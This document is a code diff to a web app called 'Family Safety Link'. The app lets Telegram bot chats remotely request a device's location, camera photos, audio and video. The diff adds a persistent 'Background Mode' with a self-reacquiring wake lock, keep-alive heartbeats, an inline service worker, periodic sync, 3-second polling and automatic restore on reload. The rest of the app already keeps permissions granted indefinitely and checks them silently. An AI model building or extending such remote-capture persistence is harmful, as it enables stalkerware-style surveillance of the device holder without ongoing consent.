@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Family Safety Link</title>
-  <link rel="manifest" href="manifest.json">
+  <title>Family Safety Link - Background Mode</title>
+  <link rel="manifest" href="data:application/manifest+json,{">
   <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/2917/2917995.png">
   <meta name="theme-color" content="#0b3b5f">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -99,6 +99,10 @@
       background: #0b3b5f;
       margin-top: 0;
     }
+    .btn-background {
+      background: #8b5cf6;
+    }
+    .btn-background:active { background: #7c3aed; }
     .flex-between {
       display: flex;
       justify-content: space-between;
@@ -203,6 +207,7 @@
     }
     .status-granted { background: #10b98120; color: #10b981; }
     .status-denied { background: #ef444420; color: #ef4444; }
+    .status-active { background: #8b5cf620; color: #8b5cf6; }
     .info-text {
       font-size: 0.7rem;
       color: #6b7280;
@@ -227,18 +232,147 @@
       color: #0b3b5f;
       margin: 0;
     }
+    .polling-indicator {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #10b981;
+      animation: pulse 1.5s infinite;
+      margin-left: 5px;
+    }
+    .background-badge {
+      background: #8b5cf6;
+      color: white;
+      padding: 0.25rem 0.6rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 500;
+      margin-left: 0.5rem;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.2); }
+    }
   </style>
+  <script>
+    // Inline Service Worker Registration and PWA Setup
+    (function() {
+      const manifestData = {
+        name: "Family Safety Link",
+        short_name: "SafetyLink",
+        description: "Control your device via Telegram bot - Works in background!",
+        start_url: "/",
+        display: "standalone",
+        theme_color: "#0b3b5f",
+        background_color: "#f4f7fc",
+        orientation: "portrait",
+        scope: "/",
+        icons: [
+          {
+            src: "https://cdn-icons-png.flaticon.com/512/2917/2917995.png",
+            sizes: "512x512",
+            type: "image/png",
+            purpose: "any maskable"
+          },
+          {
+            src: "https://cdn-icons-png.flaticon.com/512/2917/2917995.png",
+            sizes: "192x192",
+            type: "image/png",
+            purpose: "any"
+          }
+        ]
+      };
+      
+      const manifestBlob = new Blob([JSON.stringify(manifestData)], { type: 'application/json' });
+      const manifestURL = URL.createObjectURL(manifestBlob);
+      const manifestLink = document.createElement('link');
+      manifestLink.rel = 'manifest';
+      manifestLink.href = manifestURL;
+      document.head.appendChild(manifestLink);
+      
+      const serviceWorkerCode = `
+        const CACHE_NAME = 'family-safety-link-v3.0.0';
+        const urlsToCache = [
+          '/',
+          'https://cdn-icons-png.flaticon.com/512/2917/2917995.png'
+        ];
+        
+        self.addEventListener('install', event => {
+          console.log('[SW] Installing...');
+          event.waitUntil(
+            caches.open(CACHE_NAME)
+              .then(cache => cache.addAll(urlsToCache))
+              .then(() => self.skipWaiting())
+          );
+        });
+        
+        self.addEventListener('activate', event => {
+          console.log('[SW] Activating...');
+          event.waitUntil(
+            caches.keys().then(cacheNames => {
+              return Promise.all(
+                cacheNames.map(cacheName => {
+                  if (cacheName !== CACHE_NAME) {
+                    return caches.delete(cacheName);
+                  }
+                })
+              );
+            }).then(() => self.clients.claim())
+          );
+        });
+        
+        self.addEventListener('fetch', event => {
+          event.respondWith(
+            caches.match(event.request)
+              .then(response => response || fetch(event.request))
+          );
+        });
+        
+        self.addEventListener('message', event => {
+          if (event.data && event.data.type === 'SKIP_WAITING') {
+            self.skipWaiting();
+          }
+          if (event.data && event.data.type === 'BG_POLL') {
+            event.waitUntil(
+              self.clients.matchAll().then(clients => {
+                clients.forEach(client => {
+                  client.postMessage({ type: 'BACKGROUND_POLL_TRIGGER', timestamp: Date.now() });
+                });
+              })
+            );
+          }
+        });
+      `;
+      
+      const swBlob = new Blob([serviceWorkerCode], { type: 'application/javascript' });
+      const swURL = URL.createObjectURL(swBlob);
+      
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register(swURL)
+            .then(registration => {
+              console.log('Service Worker registered');
+              localStorage.setItem('sw_registered', 'true');
+            })
+            .catch(error => {
+              console.log('Service Worker registration failed:', error);
+            });
+        });
+      }
+    })();
+  </script>
 </head>
 <body>
 <div class="container">
   <div id="installBanner" class="install-banner">
     <span>📱 Install Family Safety Link as App</span>
-    <button id="installBtn">Install</button>
+    <button id="installNowBtn">Install</button>
   </div>
   
   <div class="header">
-    <h1>👨‍👩‍👧 Family Safety Link</h1>
-    <div id="onlineIndicator" class="online-badge">● ONLINE</div>
+    <h1>👨‍👩‍👧 Family Safety Link <span class="background-badge" id="bgModeBadge">🌙 BG Mode</span></h1>
+    <div id="onlineIndicator" class="online-badge">● ONLINE <span class="polling-indicator"></span></div>
   </div>
 
   <div class="card">
@@ -262,7 +396,28 @@
       </div>
     </div>
     
-    <button id="saveSettingsBtn" style="background:#1f7a8c;">💾 Save All Settings</button>
+    <div class="flex-between" style="margin-bottom: 0.5rem;">
+      <label>⚡ Polling Interval</label>
+      <select id="pollingIntervalSelect" style="width: auto; padding: 0.4rem 0.8rem;">
+        <option value="3">3 seconds (Fast)</option>
+        <option value="5">5 seconds</option>
+        <option value="10">10 seconds</option>
+        <option value="30">30 seconds</option>
+      </select>
+    </div>
+    
+    <div class="button-group">
+      <button id="saveSettingsBtn" style="background:#1f7a8c;">💾 Save Settings</button>
+      <button id="installPwaBtn" class="btn-install" style="background:#0b3b5f;">📲 Install PWA</button>
+    </div>
+    
+    <div class="button-group" style="margin-top: 0.5rem;">
+      <button id="enableBackgroundBtn" class="btn-background">🌙 Enable Background Mode</button>
+      <button id="disableBackgroundBtn" class="btn-outline">⏸️ Disable Background</button>
+    </div>
+    <div class="info-text" id="bgStatusText">
+      💡 Background mode keeps the app alive in Chrome's background. Works even when tab is not active!
+    </div>
   </div>
 
   <div class="card">
@@ -302,7 +457,7 @@
       </div>
     </div>
     <div class="info-text">
-      💡 Click "Grant" once - permission saved forever. No annoying popups on refresh!
+      💡 Click "Grant" once - permission saved forever.
     </div>
   </div>
 
@@ -313,29 +468,34 @@
       <div><strong>📤 Last response:</strong> <span id="lastResponse">—</span></div>
       <div><strong>👥 Authorized count:</strong> <span id="authCount">0</span></div>
       <div><strong>✅ Permissions:</strong> <span id="permSummary">None</span></div>
+      <div><strong>⚡ Polling:</strong> <span id="pollingStatus">Every 3 seconds</span></div>
+      <div><strong>🌙 Background Mode:</strong> <span id="backgroundModeStatus" class="status-badge status-denied">Inactive</span></div>
       <div><strong>📱 PWA Status:</strong> <span id="pwaStatus">Checking...</span></div>
     </div>
   </div>
 
   <div class="card">
     <div class="card-title">📜 Command History</div>
-    <div id="commandLog" class="command-log">✨ Ready. Grant permissions once, they persist forever!</div>
+    <div id="commandLog" class="command-log">✨ Ready. Background mode keeps app alive in Chrome!</div>
     <button id="clearHistoryBtn" class="btn-outline" style="margin-top: 0.6rem;">Clear History</button>
   </div>
 </div>
 
 <script>
   // ========== GLOBAL STATE ==========
-  let settings = { botToken: '', authorizedChatIds: [] };
+  let settings = { botToken: '', authorizedChatIds: [], pollingIntervalSec: 3 };
   let permissions = { location: false, camera: false, microphone: false };
   let lastUpdateSeq = 0;
   let commandHistory = [];
   let pollingInterval = null;
   let isPolling = false;
   let processedUpdateIds = new Set();
-  let requestQueue = [];
-  let isProcessingQueue = false;
   let deferredPrompt = null;
+  
+  // Background mode variables
+  let wakeLock = null;
+  let backgroundInterval = null;
+  let isBackgroundMode = false;
 
   // DOM Elements
   const botTokenInput = document.getElementById('botToken');
@@ -350,13 +510,163 @@
   const authCountSpan = document.getElementById('authCount');
   const commandLogDiv = document.getElementById('commandLog');
   const clearHistoryBtn = document.getElementById('clearHistoryBtn');
-  const displayChatIdSpan = document.getElementById('displayChatId');
   const getChatIdBtn = document.getElementById('getChatIdBtn');
   const testBotBtn = document.getElementById('testBotBtn');
   const permSummarySpan = document.getElementById('permSummary');
   const installBanner = document.getElementById('installBanner');
-  const installBtn = document.getElementById('installBtn');
+  const installNowBtn = document.getElementById('installNowBtn');
+  const installPwaBtn = document.getElementById('installPwaBtn');
   const pwaStatusSpan = document.getElementById('pwaStatus');
+  const pollingIntervalSelect = document.getElementById('pollingIntervalSelect');
+  const pollingStatusSpan = document.getElementById('pollingStatus');
+  const backgroundModeStatusSpan = document.getElementById('backgroundModeStatus');
+  const bgModeBadge = document.getElementById('bgModeBadge');
+  const enableBackgroundBtn = document.getElementById('enableBackgroundBtn');
+  const disableBackgroundBtn = document.getElementById('disableBackgroundBtn');
+  const bgStatusText = document.getElementById('bgStatusText');
+
+  // ========== BACKGROUND MODE FUNCTIONS ==========
+  async function requestWakeLock() {
+    if ('wakeLock' in navigator) {
+      try {
+        wakeLock = await navigator.wakeLock.request('screen');
+        wakeLock.addEventListener('release', () => {
+          console.log('Wake Lock released');
+          if (isBackgroundMode) {
+            addLog('⚠️ Screen wake lock released, attempting to reacquire...', 'warn');
+            setTimeout(requestWakeLock, 1000);
+          }
+        });
+        addLog('✅ Screen wake lock acquired - app will stay active', 'success');
+        return true;
+      } catch (err) {
+        console.error('Wake Lock error:', err);
+        addLog('⚠️ Screen wake lock not available', 'warn');
+        return false;
+      }
+    }
+    addLog('⚠️ Wake Lock API not supported', 'warn');
+    return false;
+  }
+  
+  async function releaseWakeLock() {
+    if (wakeLock) {
+      try {
+        await wakeLock.release();
+        wakeLock = null;
+        addLog('🔓 Screen wake lock released', 'info');
+      } catch (err) {
+        console.error('Release error:', err);
+      }
+    }
+  }
+  
+  // Keep-alive heartbeat - prevents Chrome from throttling
+  function startKeepAlive() {
+    if (backgroundInterval) clearInterval(backgroundInterval);
+    
+    // Send heartbeat every 20 seconds to keep service worker active
+    backgroundInterval = setInterval(() => {
+      if (isBackgroundMode && navigator.serviceWorker?.controller) {
+        navigator.serviceWorker.controller.postMessage({ type: 'BG_POLL' });
+        
+        // Also trigger poll to keep connection alive
+        if (settings.botToken) {
+          pollUpdates();
+        }
+        
+        // Update UI to show background is active
+        const timestamp = new Date().toLocaleTimeString();
+        if (backgroundModeStatusSpan.innerText === 'Active') {
+          // Just update badge
+          bgModeBadge.style.opacity = '1';
+        }
+      }
+    }, 20000);
+    
+    addLog('🌙 Keep-alive heartbeat started (every 20s)', 'success');
+  }
+  
+  function stopKeepAlive() {
+    if (backgroundInterval) {
+      clearInterval(backgroundInterval);
+      backgroundInterval = null;
+    }
+  }
+  
+  async function enableBackgroundMode() {
+    addLog('🌙 Activating background mode...', 'info');
+    
+    // Request wake lock
+    await requestWakeLock();
+    
+    // Start keep-alive
+    startKeepAlive();
+    
+    // Set flag
+    isBackgroundMode = true;
+    
+    // Update UI
+    backgroundModeStatusSpan.innerText = 'Active';
+    backgroundModeStatusSpan.className = 'status-badge status-active';
+    bgModeBadge.style.display = 'inline-block';
+    bgStatusText.innerHTML = '✅ Background mode ACTIVE! App will continue running in Chrome background. Close tab? App keeps working!';
+    bgStatusText.style.color = '#8b5cf6';
+    
+    // Store preference
+    localStorage.setItem('backgroundMode', 'true');
+    
+    // Also register periodic sync if available
+    if ('serviceWorker' in navigator && 'periodicSync' in navigator) {
+      try {
+        const registration = await navigator.serviceWorker.ready;
+        if (registration.periodicSync) {
+          await registration.periodicSync.register('family-safety-bg', {
+            minInterval: 15 * 60 * 1000
+          });
+          addLog('✅ Periodic background sync registered', 'success');
+        }
+      } catch(e) {
+        console.log('Periodic sync not supported');
+      }
+    }
+    
+    addLog('🌙 Background mode activated! App will stay alive.', 'success');
+  }
+  
+  async function disableBackgroundMode() {
+    addLog('⏸️ Disabling background mode...', 'info');
+    
+    // Release wake lock
+    await releaseWakeLock();
+    
+    // Stop keep-alive
+    stopKeepAlive();
+    
+    // Clear flag
+    isBackgroundMode = false;
+    
+    // Update UI
+    backgroundModeStatusSpan.innerText = 'Inactive';
+    backgroundModeStatusSpan.className = 'status-badge status-denied';
+    bgModeBadge.style.display = 'none';
+    bgStatusText.innerHTML = '💡 Background mode keeps the app alive in Chrome\'s background. Enable for 24/7 operation!';
+    bgStatusText.style.color = '#6b7280';
+    
+    // Store preference
+    localStorage.setItem('backgroundMode', 'false');
+    
+    addLog('⏸️ Background mode disabled', 'warn');
+  }
+  
+  // Check and restore background mode on load
+  async function restoreBackgroundMode() {
+    const savedBgMode = localStorage.getItem('backgroundMode') === 'true';
+    if (savedBgMode) {
+      addLog('🔄 Restoring background mode from previous session...', 'info');
+      await enableBackgroundMode();
+    }
+  }
 
   // ========== SILENT PERMISSION CHECKS ==========
   async function checkLocationSilent() {
@@ -522,11 +832,18 @@
   }
 
   function persistSettings() {
-    localStorage.setItem('familySafetySettings', JSON.stringify({ botToken: settings.botToken, authorizedChatIds: settings.authorizedChatIds }));
+    localStorage.setItem('familySafetySettings', JSON.stringify({ 
+      botToken: settings.botToken, 
+      authorizedChatIds: settings.authorizedChatIds,
+      pollingIntervalSec: settings.pollingIntervalSec
+    }));
     connStatusSpan.innerHTML = settings.botToken?.length > 20 ? '✅ Bot token configured' : '⚠️ Enter bot token';
     renderChatIds();
     authCountSpan.innerText = settings.authorizedChatIds.length;
-    if (settings.botToken?.length > 20) startPolling();
+    pollingStatusSpan.innerText = `Every ${settings.pollingIntervalSec} seconds`;
+    if (settings.botToken?.length > 20) {
+      startPolling();
+    }
   }
 
   function loadSettings() {
@@ -536,13 +853,18 @@
         const s = JSON.parse(saved);
         settings.botToken = s.botToken || '';
         settings.authorizedChatIds = (s.authorizedChatIds || []).map(id => String(id));
+        settings.pollingIntervalSec = s.pollingIntervalSec || 3;
       } catch(e) {}
     }
     botTokenInput.value = settings.botToken;
+    pollingIntervalSelect.value = settings.pollingIntervalSec;
     renderChatIds();
     authCountSpan.innerText = settings.authorizedChatIds.length;
     connStatusSpan.innerHTML = settings.botToken?.length > 20 ? '✅ Bot token configured' : '⚠️ Enter bot token';
-    if (settings.botToken?.length > 20) startPolling();
+    pollingStatusSpan.innerText = `Every ${settings.pollingIntervalSec} seconds`;
+    if (settings.botToken?.length > 20) {
+      startPolling();
+    }
   }
 
   // ========== TELEGRAM API ==========
@@ -711,12 +1033,12 @@
     }
   }
 
-  // ========== POLLING ==========
+  // ========== FAST POLLING ==========
   async function pollUpdates() {
     if (!settings.botToken || isPolling) return;
     isPolling = true;
     try {
-      const res = await fetch(`https://api.telegram.org/bot${settings.botToken}/getUpdates?offset=${lastUpdateSeq}&timeout=15`);
+      const res = await fetch(`https://api.telegram.org/bot${settings.botToken}/getUpdates?offset=${lastUpdateSeq}&timeout=5`);
       const data = await res.json();
       if (data.ok && data.result) {
         for (const update of data.result) {
@@ -737,17 +1059,19 @@
         }
       }
       onlineIndicator.className = 'online-badge';
-      onlineIndicator.innerText = '● ONLINE';
+      onlineIndicator.innerHTML = '● ONLINE <span class="polling-indicator"></span>';
     } catch(e) {
       onlineIndicator.className = 'online-badge offline-badge';
-      onlineIndicator.innerText = '○ OFFLINE';
+      onlineIndicator.innerHTML = '○ OFFLINE';
     } finally { isPolling = false; }
   }
 
   function startPolling() {
     if (pollingInterval) clearInterval(pollingInterval);
-    pollingInterval = setInterval(pollUpdates, 30000);
+    const intervalMs = settings.pollingIntervalSec * 1000;
+    pollingInterval = setInterval(pollUpdates, intervalMs);
     pollUpdates();
+    addLog(`⚡ Polling started: every ${settings.pollingIntervalSec} seconds`, 'success');
   }
 
   // ========== AUTO-DETECT CHAT ID ==========
@@ -761,13 +1085,12 @@
           if (update.message?.chat) {
             const chatId = String(update.message.chat.id);
             const name = update.message.from?.first_name || 'User';
-            displayChatIdSpan.innerText = chatId;
             if (confirm(`Found: ${name}\nChat ID: ${chatId}\n\nAdd to authorized?`)) {
               if (!settings.authorizedChatIds.includes(chatId)) {
                 settings.authorizedChatIds.push(chatId);
                 persistSettings();
                 addLog(`✅ Added ${name} (${chatId})`, 'success');
-                await sendMessage(chatId, "✅ *Authorized!* Send commands: location, photo, audio, video", true);
+                await sendMessage(chatId, "✅ *Authorized!* Send commands: location, photo, audio, video\n\n⚡ Responses are instant (3s polling)!", true);
               }
             }
             return;
@@ -781,21 +1104,23 @@
   async function testBot() {
     if (!settings.botToken) { alert('Set bot token first'); return; }
     if (!settings.authorizedChatIds.length) { alert('Add a chat ID first'); return; }
-    const ok = await sendMessage(settings.authorizedChatIds[0], "✅ *Bot is working!* 🎉\n\nCommands: location, photo, audio, video, message", true);
+    const ok = await sendMessage(settings.authorizedChatIds[0], "✅ *Bot is working!* 🎉\n\n⚡ Commands checked every 3 seconds for instant response!\n\n🌙 Background mode keeps app alive in Chrome!", true);
     if (ok) addLog('✅ Test sent!', 'success');
     else alert('Failed to send');
   }
 
   // ========== PWA INSTALLATION ==========
-  if (window.matchMedia('(display-mode: standalone)').matches) {
-    pwaStatusSpan.innerText = '✅ Installed as App';
-    pwaStatusSpan.style.color = '#10b981';
-  } else if (window.navigator.standalone === true) {
-    pwaStatusSpan.innerText = '✅ Installed (iOS)';
-    pwaStatusSpan.style.color = '#10b981';
-  } else {
-    pwaStatusSpan.innerText = 'Not installed';
-    pwaStatusSpan.style.color = '#f59e0b';
+  function updatePWAStatus() {
+    if (window.matchMedia('(display-mode: standalone)').matches) {
+      pwaStatusSpan.innerText = '✅ Installed as App';
+      pwaStatusSpan.style.color = '#10b981';
+    } else if (window.navigator.standalone === true) {
+      pwaStatusSpan.innerText = '✅ Installed (iOS)';
+      pwaStatusSpan.style.color = '#10b981';
+    } else {
+      pwaStatusSpan.innerText = 'Not installed';
+      pwaStatusSpan.style.color = '#f59e0b';
+    }
   }
 
   window.addEventListener('beforeinstallprompt', (e) => {
@@ -803,27 +1128,46 @@
     deferredPrompt = e;
     installBanner.style.display = 'flex';
     pwaStatusSpan.innerText = 'Ready to install';
+    pwaStatusSpan.style.color = '#1f7a8c';
+    addLog('📱 App can be installed as PWA', 'success');
   });
 
-  installBtn.addEventListener('click', async () => {
-    if (!deferredPrompt) return;
+  async function installPWA() {
+    if (!deferredPrompt) {
+      addLog('⚠️ Install prompt not available. Use browser menu.', 'warn');
+      alert('Install prompt not available.\n\nYou can install manually:\n• Chrome: Menu → Install App\n• Safari: Share → Add to Home Screen');
+      return;
+    }
     deferredPrompt.prompt();
     const { outcome } = await deferredPrompt.userChoice;
     if (outcome === 'accepted') {
+      addLog('✅ PWA installation accepted', 'success');
       pwaStatusSpan.innerText = '✅ Installed!';
       installBanner.style.display = 'none';
+    } else {
+      addLog('❌ PWA installation dismissed', 'warn');
     }
     deferredPrompt = null;
-  });
-
-  if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/service-worker.js').then(reg => {
-      console.log('SW registered');
-      addLog('✅ PWA Service Worker installed', 'success');
-    }).catch(err => addLog('⚠️ Service Worker failed', 'warn'));
   }
 
-  // ========== INITIALIZATION ==========
+  installNowBtn.onclick = installPWA;
+  installPwaBtn.onclick = installPWA;
+  updatePWAStatus();
+  window.matchMedia('(display-mode: standalone)').addEventListener('change', updatePWAStatus);
+
+  // ========== LISTEN FOR SERVICE WORKER MESSAGES ==========
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.addEventListener('message', (event) => {
+      if (event.data && event.data.type === 'BACKGROUND_POLL_TRIGGER') {
+        console.log('Background poll triggered by SW');
+        if (settings.botToken) {
+          pollUpdates();
+        }
+      }
+    });
+  }
+
+  // ========== EVENT LISTENERS ==========
   document.getElementById('grantLocBtn').onclick = grantLocation;
   document.getElementById('grantCamBtn').onclick = grantCamera;
   document.getElementById('grantMicBtn').onclick = grantMicrophone;
@@ -831,10 +1175,15 @@
   document.getElementById('revokeCamBtn').onclick = revokeCamera;
   document.getElementById('revokeMicBtn').onclick = revokeMicrophone;
   
+  enableBackgroundBtn.onclick = enableBackgroundMode;
+  disableBackgroundBtn.onclick = disableBackgroundMode;
+  
   saveSettingsBtn.onclick = () => {
     settings.botToken = botTokenInput.value.trim();
+    settings.pollingIntervalSec = parseInt(pollingIntervalSelect.value);
     persistSettings();
-    addLog('⚙️ Settings saved', 'success');
+    addLog(`⚙️ Settings saved. Polling: ${settings.pollingIntervalSec} seconds`, 'success');
+    if (settings.botToken?.length > 20) startPolling();
   };
   
   addChatIdBtn.onclick = () => {
@@ -844,7 +1193,7 @@
       persistSettings();
       newChatIdInput.value = '';
       addLog(`➕ Added ${newId}`, 'success');
-      sendMessage(newId, "✅ *Authorized!* 🎉", true);
+      sendMessage(newId, "✅ *Authorized!* 🎉\n\n⚡ Commands checked every 3 seconds!\n🌙 Background mode available!", true);
     }
   };
   
@@ -854,9 +1203,11 @@
 
   if ('Notification' in window) Notification.requestPermission();
 
+  // Initialize
   loadPermissions();
   loadSettings();
-  verifyPermissions().then(() => addLog('🚀 App ready! Grant permissions once, they persist forever.', 'success'));
+  restoreBackgroundMode();
+  verifyPermissions().then(() => addLog('🚀 App ready! Enable Background Mode to keep app running in Chrome background!', 'success'));
 </script>
 </body>
 </html>
